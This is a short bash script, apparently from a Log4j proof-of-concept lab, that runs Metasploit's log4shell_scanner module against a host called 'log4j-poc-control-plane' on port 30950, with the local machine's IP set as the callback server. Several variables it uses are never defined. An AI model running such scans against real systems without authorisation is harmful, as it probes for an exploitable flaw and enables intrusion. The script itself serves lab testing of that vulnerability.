#!/bin/bash
# Get your own the IP address
SERVER_IP=`hostname -I | awk '{print $1}'`
# This is the target dns
REMOTE_IP="log4j-poc-control-plane"
# This is the target port serving the application
REMOTE_PORT="30950"

# Run metasploit with the arguments
msfconsole -x "use auxiliary/scanner/http/log4shell_scanner;set TARGETURI /;set RHOSTS ${REMOTE_IP};set SRVHOST ${SERVER_IP};set RPORT ${REMOTE_PORT};set SRVPORT ${SERVER_PORT};set LDAP_TIMEOUT ${LDAP_TIMEOUT};set THREADS ${THREADS};options;run;exit"
